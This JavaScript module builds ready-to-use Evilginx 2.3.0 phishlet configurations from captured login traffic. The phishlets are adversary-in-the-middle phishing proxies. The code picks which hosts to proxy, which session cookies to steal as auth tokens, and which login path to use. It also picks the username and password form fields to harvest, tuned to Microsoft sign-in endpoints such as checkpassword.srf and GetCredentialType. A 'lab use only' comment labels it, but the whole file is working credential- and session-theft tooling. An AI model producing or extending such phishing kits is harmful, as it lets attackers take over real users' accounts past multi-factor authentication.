/**
 * Evilginx 2.3.0 Phishlet Generator
 * Generates operator-ready phishlet YAML from captured auth flows
 * NO PLACEHOLDERS - all fields must be real or documented heuristics
 */

import * as yaml from 'js-yaml';
import { extractDomain, isAuthRelevantHost } from './host-classifier.js';

// Priority username field names (exact match, case-insensitive)
const USERNAME_PRIORITY = ['loginfmt', 'login', 'user', 'username', 'usernameEntry', 'email', 'account'];

// Excluded paths for login.path selection
const LOGIN_PATH_EXCLUDES = [
  '/consumers/oauth2/v2.0/authorize',
  '/consumers/savestate',
  '/auth/complete-silent-signin',
  'complete-signin',
  'complete-oauth',
  'silent-signin'
];

// Paths that should appear in auth_urls (even if not selected as login.path)
const AUTH_URL_INCLUDES = [
  '/checkpassword.srf',
  '/common/GetCredentialType',
  'checkpassword',
  'GetCredentialType'
];

/**
 * Generate Evilginx 2.3.0 phishlet from capture data
 */
export function generatePhishlet(captureData, options = {}) {
  const {
    author = 'lab-operator',
    includeHosts = []
  } = options;

  // Validate input
  if (!captureData || !captureData.events || captureData.events.length === 0) {
    throw new Error('Cannot generate phishlet: no events in capture data');
  }

  // Extract and classify hosts
  const hosts = classifyHosts(captureData.events, includeHosts);

  if (hosts.length === 0) {
    throw new Error('Cannot generate phishlet: no auth-relevant hosts found after filtering');
  }

  // Build proxy_hosts
  const proxyHosts = buildProxyHosts(hosts, captureData.events);

  // Extract auth tokens (cookie names)
  const authTokens = buildAuthTokens(hosts, captureData.events);

  // Determine login.path and auth_urls
  const { loginDomain, loginPath, authUrls } = selectLoginPath(captureData.events, hosts);

  // Extract credentials from form_fields
  const credentials = extractCredentials(captureData.events);

  // Build sub_filters
  const subFilters = buildSubFilters(proxyHosts);

  // Build phishlet structure
  const phishlet = {
    author,
    min_ver: '2.3.0',
    proxy_hosts: proxyHosts,
    auth_tokens: authTokens,
    auth_urls: authUrls,
    login: {
      domain: loginDomain,
      path: loginPath
    },
    credentials,
    sub_filters: subFilters
  };

  return phishlet;
}

/**
 * Classify hosts into auth-relevant set
 */
function classifyHosts(events, includeHosts = []) {
  const hostMap = new Map();

  for (const event of events) {
    try {
      const url = new URL(event.url);
      const hostname = url.hostname;
      const domain = extractDomain(hostname);

      if (!domain) continue;

      // Check if host is auth-relevant
      if (!isAuthRelevantHost(hostname, domain, event, events) &&
          !includeHosts.includes(hostname)) {
        continue;
      }

      if (!hostMap.has(domain)) {
        hostMap.set(domain, {
          domain,
          hostnames: new Set(),
          hasCookies: false,
          hasPasswordForm: false,
          hasAuthPath: false
        });
      }

      const hostData = hostMap.get(domain);
      hostData.hostnames.add(hostname);

      // Track cookies
      if (event.set_cookie_names && event.set_cookie_names.length > 0) {
        hostData.hasCookies = true;
      }

      // Track password forms
      if (event.form_fields) {
        for (const form of event.form_fields) {
          const hasPassword = form.fields.some(f => f.type === 'password');
          if (hasPassword) {
            hostData.hasPasswordForm = true;
          }
        }
      }

      // Track auth paths
      const path = url.pathname.toLowerCase();
      if (path.includes('login') || path.includes('password') || path.includes('auth') ||
          path.includes('checkpassword') || path.includes('getcredentialtype')) {
        hostData.hasAuthPath = true;
      }
    } catch (e) {
      // Invalid URL, skip
    }
  }

  return Array.from(hostMap.values());
}

/**
 * Build proxy_hosts array
 */
function buildProxyHosts(hosts, events) {
  const proxyHosts = [];
  let landingSet = false;

  for (const host of hosts) {
    // Pick representative hostname (prefer login/account/auth subdomain)
    const hostname = pickRepresentativeHostname(host.hostnames);
    const url = new URL(`https://${hostname}`);
    const parts = hostname.split('.');
    const domainParts = host.domain.split('.');

    // Extract orig_sub - leftmost meaningful label before domain
    let origSub = '';
    if (parts.length > domainParts.length) {
      origSub = parts[0];
    }

    // Set phish_sub to match orig_sub for now
    const phishSub = origSub;

    // Session tracking - has cookies
    const session = host.hasCookies;

    // Landing page - first host with password form or auth path
    const isLanding = !landingSet && (host.hasPasswordForm || host.hasAuthPath);
    if (isLanding) landingSet = true;

    proxyHosts.push({
      phish_sub: phishSub,
      orig_sub: origSub,
      domain: host.domain,
      session,
      is_landing: isLanding,
      auto_filter: true
    });
  }

  // Ensure at least one landing page
  if (!landingSet && proxyHosts.length > 0) {
    proxyHosts[0].is_landing = true;
  }

  return proxyHosts;
}

/**
 * Pick representative hostname from set
 */
function pickRepresentativeHostname(hostnames) {
  const array = Array.from(hostnames);

  // Prefer login/account/auth subdomains
  const preferred = array.find(h =>
    h.includes('login.') || h.includes('account.') || h.includes('auth.')
  );
  if (preferred) return preferred;

  // Otherwise use first
  return array[0];
}

/**
 * Build auth_tokens array
 */
function buildAuthTokens(hosts, events) {
  const tokenMap = new Map();

  for (const event of events) {
    if (!event.set_cookie_names || event.set_cookie_names.length === 0) continue;

    try {
      const url = new URL(event.url);
      const hostname = url.hostname;
      const domain = extractDomain(hostname);

      if (!domain) continue;

      // Only include cookies from auth-relevant hosts
      const hostData = hosts.find(h => h.domain === domain);
      if (!hostData) continue;

      if (!tokenMap.has(domain)) {
        tokenMap.set(domain, new Set());
      }

      const cookieSet = tokenMap.get(domain);
      event.set_cookie_names.forEach(name => cookieSet.add(name));
    } catch (e) {
      // Invalid URL
    }
  }

  const authTokens = [];
  for (const [domain, cookieNames] of tokenMap.entries()) {
    if (cookieNames.size > 0) {
      authTokens.push({
        domain,
        keys: Array.from(cookieNames)
      });
    }
  }

  return authTokens;
}

/**
 * Select login.path and build auth_urls
 */
function selectLoginPath(events, hosts) {
  const candidates = [];
  const authUrls = [];

  for (const event of events) {
    try {
      const url = new URL(event.url);
      const hostname = url.hostname;
      const domain = extractDomain(hostname);
      const path = url.pathname;

      // Only consider auth-relevant hosts
      const hostData = hosts.find(h => h.domain === domain);
      if (!hostData) continue;

      // Check if path should be in auth_urls
      const isAuthUrl = AUTH_URL_INCLUDES.some(pattern =>
        path.toLowerCase().includes(pattern.toLowerCase())
      );
      if (isAuthUrl && !authUrls.includes(path)) {
        authUrls.push(path);
      }

      // Skip excluded paths for login.path
      const isExcluded = LOGIN_PATH_EXCLUDES.some(pattern =>
        path.toLowerCase().includes(pattern.toLowerCase())
      );
      if (isExcluded) continue;

      // Rank candidates
      let score = 0;

      // Priority 1: Password form action
      if (event.form_fields) {
        for (const form of event.form_fields) {
          const hasPassword = form.fields.some(f => f.type === 'password');
          if (hasPassword) {
            try {
              const actionUrl = new URL(form.form_action);
              candidates.push({
                domain,
                path: actionUrl.pathname,
                score: 100
              });
            } catch (e) {
              // Invalid form action URL
            }
          }
        }
      }

      // Priority 2: POST with password/checkpassword in path
      if (event.method === 'POST') {
        if (path.toLowerCase().includes('password') ||
            path.toLowerCase().includes('checkpassword')) {
          score = 90;
        }
        // Priority 3: GetCredentialType or login paths
        else if (path.toLowerCase().includes('getcredentialtype') ||
                 path.toLowerCase().includes('login')) {
          score = 80;
        }
      }

      if (score > 0) {
        candidates.push({ domain, path, score });
      }
    } catch (e) {
      // Invalid URL
    }
  }

  // Sort by score descending
  candidates.sort((a, b) => b.score - a.score);

  if (candidates.length === 0) {
    // Fallback: use first auth-path event
    for (const event of events) {
      try {
        const url = new URL(event.url);
        const domain = extractDomain(url.hostname);
        const hostData = hosts.find(h => h.domain === domain);
        if (hostData) {
          return {
            loginDomain: domain,
            loginPath: url.pathname,
            authUrls
          };
        }
      } catch (e) {
        // Invalid URL
      }
    }

    // Ultimate fallback
    return {
      loginDomain: hosts[0].domain,
      loginPath: '/login',
      authUrls
    };
  }

  return {
    loginDomain: candidates[0].domain,
    loginPath: candidates[0].path,
    authUrls
  };
}

/**
 * Extract credentials from captured form fields
 */
function extractCredentials(events) {
  // Find password-bearing forms
  let usernameKey = null;
  let passwordKey = null;

  for (const event of events) {
    if (!event.form_fields) continue;

    for (const form of event.form_fields) {
      const passwordField = form.fields.find(f => f.type === 'password');
      if (!passwordField) continue; // Only consider forms with password fields

      // Found password field
      passwordKey = passwordField.name;

      // Find username field - check priority names first (case-insensitive)
      for (const priorityName of USERNAME_PRIORITY) {
        const usernameField = form.fields.find(f =>
          f.name.toLowerCase() === priorityName.toLowerCase()
        );
        if (usernameField) {
          usernameKey = usernameField.name;
          break;
        }
      }

      // If found both, we're done
      if (usernameKey && passwordKey) {
        break;
      }
    }

    if (usernameKey && passwordKey) {
      break;
    }
  }

  // If no DOM-evidenced keys, use heuristics
  if (!usernameKey) usernameKey = 'login';
  if (!passwordKey) passwordKey = 'passwd';

  return {
    username: {
      key: usernameKey,
      search: '(.*)',
      type: 'post'
    },
    password: {
      key: passwordKey,
      search: '(.*)',
      type: 'post'
    }
  };
}

/**
 * Build sub_filters array from proxy_hosts
 */
function buildSubFilters(proxyHosts) {
  const filters = [];

  for (const host of proxyHosts) {
    // Build triggers_on
    const triggersOn = host.orig_sub ? `${host.orig_sub}.${host.domain}` : host.domain;

    filters.push({
      triggers_on: triggersOn,
      orig_sub: host.orig_sub,
      domain: host.domain,
      search: 'https://{hostname}/',
      replace: 'https://{hostname}/',
      mimes: ['text/html', 'application/json', 'application/javascript']
    });
  }

  return filters;
}

/**
 * Export phishlet to YAML string
 */
export function exportPhishletYaml(phishlet) {
  // Add lab-use comment
  const header = '# Generated by Chrome MV3 Lab Kit - Authorized lab use only\n' +
                 '# Operator must configure phishlet domain/lures and lab-test\n\n';

  const yamlContent = yaml.dump(phishlet, {
    indent: 2,
    lineWidth: 120,
    noRefs: true,
    sortKeys: false
  });

  return header + yamlContent;
}

/**
 * Validate that YAML contains no placeholder tokens
 */
export function validateNoPlaceholders(yamlText) {
  if (yamlText.includes('{{PLACEHOLDER}}')) {
    throw new Error('Generated phishlet contains {{PLACEHOLDER}} tokens - generation failed');
  }
}
